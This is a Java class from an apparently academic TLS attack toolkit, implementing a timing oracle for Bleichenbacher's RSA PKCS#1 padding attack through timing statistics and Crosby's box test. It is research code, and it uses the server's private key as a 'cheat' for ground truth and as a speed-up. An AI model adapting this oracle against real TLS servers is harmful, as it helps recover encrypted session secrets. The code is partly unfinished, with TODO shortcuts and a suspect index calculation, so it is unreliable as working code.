package de.rub.nds.ssl.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.attacker.bleichenbacher.OracleType;
import de.rub.nds.ssl.attacker.misc.CommandLineWorkflowExecutor;
import de.rub.nds.ssl.attacker.misc.PKCS15Toolkit;
import de.rub.nds.ssl.attacker.misc.Utility;
import java.io.FileWriter;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

/**
 * Stripped down version of the Timing Oracle.
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * Jun 27, 2013
 */
public final class CommandLineTimingOracle extends AOracle {

    /*
     * CONFIGURATION SECTION
     */
    /**
     * Amount of training measurements per Oracle request.
     */
    private static final int MEASUREMENT_AMOUNT = 200;
    /**
     * Amount of training measurementsTest.
     */
    private static final int TRAINING_AMOUNT = 10000;
    /**
     * Amount of warmup measurementsTest.
     */
    private static final int WARMUP_AMOUNT = 50;
    /*
     * RUNTIME DATA SECTION
     */
    /**
     * Bridge to the executing client.
     */
    private CommandLineWorkflowExecutor clwe;
    /**
     * List of valid timings.
     */
    private ArrayList<Long> validTimings = new ArrayList<>(TRAINING_AMOUNT);
    /**
     * List of invalid timings.
     */
    private ArrayList<Long> invalidTimings = new ArrayList<>(TRAINING_AMOUNT);
    /**
     * TODO: Sebastian - bitte bitte bitte Parameter kommentieren!
     */
    private int counterOracle = 0;
    /**
     * Cipher (needed for the cheat operation).
     */
    private Cipher cipher;
    /**
     * Valid PKCS encrypted PMS.
     */
    private byte[] validPMS;
    /**
     * Invalid PKCS encrypted PMS.
     */
    private byte[] invalidPMS;
    /**
     * Boundary to distinguish PKCS valid (but PMS invalid) from PKCS invalid.
     */
    private int minBoxPos = 15;
    /**
     * Boundary to distinguish PKCS invalid from PKCS valid (but PMS invalid).
     */
    private int maxBoxPos = 20;
    /**
     * Round counter - trick to speed up finding: TODO: REMOVE ME.
     */
    private int round = 0;

    /**
     * Create a new instance of this object.
     *
     * @param type Oracle type.
     * @param rsaPublicKey Public key of the server.
     * @param rsaPrivateKey Private key of the server - needed for cheating.
     * @param command Command to be executed.
     */
    public CommandLineTimingOracle(final OracleType type,
            final RSAPublicKey rsaPublicKey,
            final RSAPrivateKey rsaPrivateKey, final String command) {
        this.publicKey = rsaPublicKey;
        this.oracleType = type;
        this.blockSize = Utility.computeBlockSize(rsaPublicKey);
        try {
            this.cipher = Cipher.getInstance("RSA/None/NoPadding");
            this.cipher.init(Cipher.DECRYPT_MODE, rsaPrivateKey);
        } catch (InvalidKeyException | NoSuchAlgorithmException |
                NoSuchPaddingException ex) {
            ex.printStackTrace();
        }

        this.clwe = new CommandLineWorkflowExecutor(command);
    }

    /**
     * This method performs the statistical analysis of the timing
     * measurementsTest. It assumes that a valid key has a significantly lower
     * response time than an invalid key. In a nutshell, the method performs
     * Crosby's box test.
     *
     * @param testPKCS PKCS to be tested for validity.
     * @param firstRun Is this the first run of this method (recursion)?
     * @return True if the PKCS was a valid one or false otherwise.
     * @throws OracleException
     */
    private boolean isValidPKCS(final byte[] testPKCS, final boolean firstRun)
            throws OracleException {
        long[] validTiming = new long[MEASUREMENT_AMOUNT];
        long[] testTiming = new long[MEASUREMENT_AMOUNT];


        for (int i = 0; i < MEASUREMENT_AMOUNT; i++) {
            try {
                validTiming[i] = clwe.executeClientWithPMS(getValidPMS());
                Thread.sleep(20);
                testTiming[i] = clwe.executeClientWithPMS(testPKCS);
                Thread.sleep(20);
            } catch (InterruptedException ex) {
                Logger.getLogger(CommandLineTimingOracle.class.getName()).log(
                        Level.SEVERE, null, ex);
            }
        }
        
        // case PKCS valid (but PMS invalid)
        Arrays.sort(validTiming);
        // case PKCS valid (but PMS invalid) or PKCS invalid?
        Arrays.sort(testTiming); 

        System.out.println("####### timing: " 
                + (validTiming[minBoxPos / MEASUREMENT_AMOUNT] 
                - testTiming[minBoxPos / MEASUREMENT_AMOUNT]));

        if (validTiming[maxBoxPos / MEASUREMENT_AMOUNT] > 
                testTiming[minBoxPos / MEASUREMENT_AMOUNT]) {
            if (firstRun) {
                return isValidPKCS(testPKCS, false);
            }
            return true;
        } else {
            return false;
        }
    }

    /**
     * Warmup function - prepares the target.
     * @throws OracleException 
     */
    public void warmup() throws OracleException {
        // warmup
        System.out.print("warmup... ");
        for (int i = 0; i < WARMUP_AMOUNT / 2; i++) {
            clwe.executeClientWithPMS(getValidPMS());
            clwe.executeClientWithPMS(getInvalidPMS());
            System.out.println(i + "th round");
        }
        System.out.println("done!");
    }

    /**
     * Train the timing oracle.
     *
     * @throws OracleException
     */
    public void trainOracle() throws OracleException {

        long delay;
        // train the oracle using the executeWorkflow functionality
        for (int i = 0; i < TRAINING_AMOUNT; i++) {
            delay = clwe.executeClientWithPMS(getValidPMS());
            validTimings.add(delay);

            delay = clwe.executeClientWithPMS(getInvalidPMS());
            invalidTimings.add(delay);

            if (i % 50 == 0) {
                System.out.print("\r left requests for training "
                        + (TRAINING_AMOUNT - i));
            }
        }
        System.out.println("\n");
        try (FileWriter fw = new FileWriter("training_data.csv");) {
            for (int i = 0; i < TRAINING_AMOUNT; i++) {
                fw.write(i + ";invalid;" + invalidTimings.get(i) + "\n");
                fw.write((i + TRAINING_AMOUNT) + ";valid;"
                        + validTimings.get(i) + "\n");
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public boolean checkPKCSConformity(final byte[] preMasterSecret)
            throws OracleException {
        boolean result;
        boolean groundTruth;

        counterOracle += 1;

        groundTruth = cheat(preMasterSecret);

        // trick to speed up PMS finding - TODO: REMOVE ME
        if (round++ < 5450) {
            return groundTruth;
        }

        numberOfQueries++;
        boolean timingOracleAnswer = isValidPKCS(preMasterSecret, true);

        if (!groundTruth) {
            if (!timingOracleAnswer) {
                /*
                 * all good!
                 */
                result = timingOracleAnswer;
                // System.err.println("OK: invalid key was predicted to "
                //        + "be invalid");
            } else {
                /*
                 * The submitted key was invalid but our test predicted 
                 * that the key was valid. This is the worst case, because 
                 * it will most certainly break the subsequent computations. 
                 * We will stop here.
                 */
                System.err.println("ERROR: invalid key was predicted to "
                        + "be valid. Stopping.");
                result = timingOracleAnswer;
                System.exit(1);
            }

        } else {
            if (!timingOracleAnswer) {
                /*
                 * The submitted key was valid but our test predicted that 
                 * the key was invalid. This decreases the performance of 
                 * the attack but does not necessarily break subsequent 
                 * computations.
                 */
                System.err.println("ERROR: valid key was predicted to "
                        + "be invalid. This decreases the attack "
                        + "performance.");
                result = timingOracleAnswer;
            } else {
                /*
                 * all good!
                 */

                // System.err.println("OK: valid key was predicted to "
                //        + "be valid");
                result = timingOracleAnswer;
            }
        }

        System.out.println(counterOracle + ": Ground truth: "
                + groundTruth + ", timingoracle: " + result);

        return result;
    }

    /**
     * Cheat - needed to confirm a guess.
     *
     * @param pms Pre Master Secret.
     * @return true if the PMS is valid, false otherwise
     */
    private boolean cheat(final byte[] pms) {
        boolean result = false;
        try {
            byte[] decryptedPMS = cipher.doFinal(pms);
            result = PKCS15Toolkit.conformityChecker(decryptedPMS,
                    oracleType, blockSize);
        } catch (BadPaddingException | IllegalBlockSizeException e) {
            e.printStackTrace();
        }

        return result;
    }

    /**
     * Get the valid encrypted PMS.
     * @return Valid PKCS encoded, encrypted PMS
     */
    public byte[] getValidPMS() {
        return validPMS;
    }

    /**
     * Set the valid encrypted PMS.
     * @param valid Valid PKCS encoded, encrypted PMS to set
     */
    public void setValidPMS(final byte[] valid) {
        this.validPMS = valid.clone();
    }

    /**
     * Get the invalid encrypted PMS.
     * @return Invalid PKCS encoded, encrypted PMS
     */
    public byte[] getInvalidPMS() {
        return invalidPMS;
    }

    /**
     * Set the invalid encrypted PMS.
     * @param invalid Invalid PKCS encoded, encrypted PMS to set
     */
    public void setInvalidPMS(final byte[] invalid) {
        this.invalidPMS = invalid.clone();
    }
}
